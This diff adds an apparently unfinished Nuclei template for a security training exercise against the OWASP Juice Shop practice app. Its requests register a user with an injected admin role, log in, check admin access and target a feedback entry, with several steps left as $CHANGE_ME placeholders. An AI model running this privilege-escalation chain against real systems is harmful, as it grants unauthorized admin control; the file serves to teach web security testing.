@@ -1,0 +1,93 @@
+id: exercise-4-template
+
+info:
+  name: exercise-4-template
+  author: bounce
+  severity: high
+variables:
+  email: "{{to_lower(rand_base(6))}}"
+  json: |
+    {
+      "email": "{{email}}",
+      "password": "admin"
+    }
+  minify: '$CHANGE_ME'
+  balancer: __Secure-balancer={$CHANGE_ME}
+
+flow: $CHANGE_ME
+
+http:
+  - method: POST
+    path:
+      - "{{Hostname}}/api/users"
+    
+    headers:
+        Content-Type: application/json
+        Connection: keep-alive
+        Cookie: {{balancer}}
+
+    cookie-reuse: true
+    
+    body: |
+        {"email":"{{email}}","password":"admin","role":"admin"}
+
+  - method: POST
+    path:
+      - "{{Hostname}}/rest/user/login"
+
+    headers:
+        Content-Type: application/json
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Cookie: {{balancer}}
+
+    cookie-reuse: true
+    
+    body: |
+        $CHANGE_ME
+    
+    matchers:
+        $CHANGE_ME
+
+    extractors:
+      - type: json
+        name: admintoken
+        internal: true
+        json:
+          - '$CHANGE_ME'
+        part: body
+
+  - method: GET
+    path:
+      - "{{Hostname}}/rest/user/authentication-details"
+
+    headers:
+        Authorization: Bearer {{$CHANGE_ME}}
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Cookie: "{{balancer}}"
+        Accept: application/json, text/plain, */*        
+
+    cookie-reuse: true   
+    
+    matchers:   
+      - type: word
+        part: body
+        words:
+          - admin@juice-sh.op
+
+  - method: $CHANGE_ME
+    path:
+      - "{{Hostname}}/api/Feedbacks/1"
+    
+    headers:
+        Connection: keep-alive
+        Authorization: $CHANGE_ME
+        Accept: application/json, text/plain, */*
+        Accept-Encoding: gzip, deflate, br
+        Cookie: {{balancer}}
+
+    cookie-reuse: true
+
+    matchers:
+        $CHANGE_ME
